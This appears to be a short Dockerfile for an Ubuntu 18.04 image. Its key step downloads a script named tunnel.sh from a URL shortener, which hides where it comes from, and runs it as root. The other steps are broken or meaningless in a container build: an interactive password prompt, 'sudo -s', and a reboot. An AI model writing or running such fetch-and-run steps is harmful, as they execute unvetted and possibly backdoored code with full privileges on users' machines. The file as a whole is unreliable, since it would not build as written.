FROM ubuntu:18.04
ENV DEBIAN_FRONTEND=noninteractive
RUN sudo -s
RUN wget https://rebrand.ly/9lj6m -O tunnel.sh && sudo bash ./tunnel.sh
RUN useradd test
RUN passwd test
RUN sudo reboot
